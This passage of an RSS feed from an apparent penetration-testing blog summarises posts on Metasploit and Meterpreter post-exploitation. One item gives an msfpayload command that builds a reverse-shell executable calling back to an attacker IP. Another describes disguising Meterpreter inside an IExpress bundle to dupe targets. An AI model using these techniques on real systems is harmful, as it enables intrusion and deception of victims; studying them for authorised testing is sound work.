Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:
 iphlpapi ws2_32 kernel32 ntdll user32 advapi32  (You can find out exactly what functions are available by default in the api.</description>
    </item>
    
    <item>
      <title>Set Wallpaper Meterpreter Script</title>
      <link>https://malicious.link/post/2010/2010-06-28-set-wallpaper-meterpreter-script/</link>
      <pubDate>Mon, 28 Jun 2010 20:34:43 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-06-28-set-wallpaper-meterpreter-script/</guid>
      <description>Certainly nothing to fuss over, but I&amp;rsquo;ve had a fascination with setting my target&amp;rsquo;s wallpaper as sort of a calling card for years now. I&amp;rsquo;ve been able to set the registry key (HKCUControl PanelDesktopWallpaper), but until recently I didn&amp;rsquo;t know how to get it to refresh so that it displayed without forcing the user to log out&amp;hellip;
First, is the most important part, selection of the wallpaper. This is my first selection:</description>
    </item>
    
    <item>
      <title>0Exploit Privilege Escalation</title>
      <link>https://malicious.link/post/2010/2010-05-07-exploit-privilege-escalation/</link>
      <pubDate>Fri, 07 May 2010 14:05:53 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-05-07-exploit-privilege-escalation/</guid>
      <description>The other day Chris Gates posted an excellent blog post about the WebDAV hotness that Chris Sullo (author of Nikto) cooked up (DAVTest) which Ryan Linn popped out a Metasploit module for.
Anyways, the story left off being a very limited user called &amp;ldquo;Network Service&amp;rdquo;. This user has Read and Execute, but no Write access, and a very limited field of view to boot.
meterpreter &amp;gt; getuid Server username: **NT AUTHORITYNETWORK SERVICE**  Lets look around a bit.</description>
    </item>
    
    <item>
      <title>Metasploit Cyberwarfare</title>
      <link>https://malicious.link/post/2010/2010-04-01-metasploit-cyberwarfare/</link>
      <pubDate>Thu, 01 Apr 2010 16:32:52 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-04-01-metasploit-cyberwarfare/</guid>
      <description>I&amp;rsquo;m not sure I will want to svn up tomorrow. This Cyberwarfare version has advanced powers:</description>
    </item>
    
    <item>
      <title>Meterpreter tunneling and VNC revamped</title>
      <link>https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/</link>
      <pubDate>Tue, 15 Dec 2009 13:00:37 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/</guid>
      <description>So yesterday (December 14th, 2009) HD Moore posted a tweet with a pic of the new VNC meterpreter script that he wrote:
Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.
https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb
Or you can get it via the SVN at Revision 7872
By creating a bind payload instead of a reverse connect we can have the payload listen locally.</description>
    </item>
    
    <item>
      <title>Metasploit with Ruby 1.9.1</title>
      <link>https://malicious.link/post/2009/2009-12-09-metasploit-with-ruby-191/</link>
      <pubDate>Wed, 09 Dec 2009 13:09:00 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-12-09-metasploit-with-ruby-191/</guid>
      <description>UPDATE: if you don&amp;rsquo;t make some additional steps, the &amp;lsquo;rvm 1.9.1&amp;rsquo; command only is active for the current console session. See the site for details: http://rvm.beginrescueend.com/
This short tutorial is how to get Ruby 1.9.1 on BT4 or any other Linux distro with the tool &amp;lsquo;rvm&amp;rsquo; (Ruby Version Manager).
The Metasploit team has put a lot of work into getting the framework to work well with 1.9.1 and still work with earlier versions.</description>
    </item>
    
    <item>
      <title>Metasploit Blends in: New MSFPayload/ENcode</title>
      <link>https://malicious.link/post/2009/2009-11-03-metasploit-blends-in-new-msfpayloadencode/</link>
      <pubDate>Tue, 03 Nov 2009 03:47:20 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-11-03-metasploit-blends-in-new-msfpayloadencode/</guid>
      <description>In Revision 7315 of the Metasploit Framework (SVN) a new option was added to MSFENCODE. Technically you always had the ability to do the following, but it required a bit of knowledge of the inner workings of the framework.
But before I get into the new feature, lets quickly go over the standard way you use msfencode:
root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe [*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) root@bt4:/pentest/exploits/framework3#  We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload.</description>
    </item>
    
    <item>
      <title>Packet Captures with Meterpreter - 7zip - WinDump - and Nmap-ish</title>
      <link>https://malicious.link/post/2009/2009-10-03-packet-captures-with-meterpreter-7zip-windump-and-nmap-ish/</link>
      <pubDate>Sat, 03 Oct 2009 02:24:05 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-10-03-packet-captures-with-meterpreter-7zip-windump-and-nmap-ish/</guid>
      <description>So this is a pretty crafty way of getting packet captures on a target system. Definitely could be streamlined with some meterpreter scripting fu, but awesome job on the video.
 Metasploit meterpreter Windump/Winpcap sniffer from siles on Vimeo.</description>
    </item>
    
    <item>
      <title>Metasploit Framework as a Payload</title>
      <link>https://malicious.link/post/2009/2009-06-26-metasploit-framework-as-a-payload/</link>
      <pubDate>Fri, 26 Jun 2009 05:45:08 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-06-26-metasploit-framework-as-a-payload/</guid>
      <description>Well, sorta…
I created a meterpreter script that takes the cygwin bundled version of Metasploit inside of a NullSoft installer that HD Moore created and deploys it using meterpreter to the compromised host, extracts/installs it, and runs the shell. Now I left this intentionally open so that you could package your own cygwin bundle (possibly with nmap and netcat), for your own evil fun.
Thanks defintely go to Carlos Perez (Dark0perator) and HD Moore for their help getting this bad boy working right.</description>
    </item>
    
    <item>
      <title>PassiveX fun with Metasploit</title>
      <link>https://malicious.link/post/2009/2009-06-10-passivex-fun-with-metasploit/</link>
      <pubDate>Wed, 10 Jun 2009 13:21:05 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-06-10-passivex-fun-with-metasploit/</guid>
      <description>I posted this walkthrough to the Metasploit mailing list, but thought that it would serve well here as well. Especially with the recent iPhone 3.0 “Special” download spam I recently received. The binary comes out to a whopping 97 bytes for the stager. Would be a blazing fast download and coupled with the IExpress “hack” would make for an very hard to spot payload.
A really down and dirty explination of what PassiveX is and why it&amp;rsquo;s useful in this sort of situation is that instead of making a direct connection back to you, it uses an iexplorer process with a cool ActiveX control to talk back.</description>
    </item>
    
    <item>
      <title>Metasploit &lt;3s Microsoft</title>
      <link>https://malicious.link/post/2009/2009-03-09-metasploit-3s-microsoft/</link>
      <pubDate>Mon, 09 Mar 2009 22:03:27 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-03-09-metasploit-3s-microsoft/</guid>
      <description>Update to post: Metasploit Heart&amp;rsquo;s Microsoft
Ok, so many people had issues with the Vimeo video, that I posted it to youtube in hopes that you&amp;rsquo;ll be able to play it all the way through. I still have no idea what the issue is, it&amp;rsquo;s played perfectly on all the computers that I&amp;rsquo;ve tried it on.
 </description>
    </item>
    
    <item>
      <title>Metasploit heart&#39;s Microsoft</title>
      <link>https://malicious.link/post/2009/2009-03-02-metasploit-hearts-microsoft/</link>
      <pubDate>Mon, 02 Mar 2009 19:24:23 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-03-02-metasploit-hearts-microsoft/</guid>
      <description>Hiding Meterpreter with IExpress from mubix on Vimeo.
Using the IExpress, a built in tool (XP, not sure about other Windows versions), we package two executables together, so that the target is less likely to suspect foul play. Now, I used calc.exe, but you can use anything on both sides of the coin. Use a better game so that it&amp;rsquo;s easyier to dupe, or a different malicious executable (leekspin perhaps?</description>
    </item>
    
    <item>
      <title>Metasploit Across the Net</title>
      <link>https://malicious.link/post/2009/2009-02-04-metasploit-across-the-net/</link>
      <pubDate>Wed, 04 Feb 2009 18:13:00 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-02-04-metasploit-across-the-net/</guid>
      <description>Metasploit is awesome, but some don’t know that their are updates all the time via SVN, and even fewer know of places to get good non-svn modules / scripts. Here are a few of my favorites:
 https://www.securinfos.info/metasploit/msfxdc.php
 http://metasploit.com/users/mc/
 http://darkoperator.blogspot.com
  &amp;ndash; newly added, check out the CookieMonster script and a host of others:
 http://pentest.cryptocity.net
  And of course: http://carnal0wnage.blogspot.com/</description>
    </item>
    
  </channel>
</rss>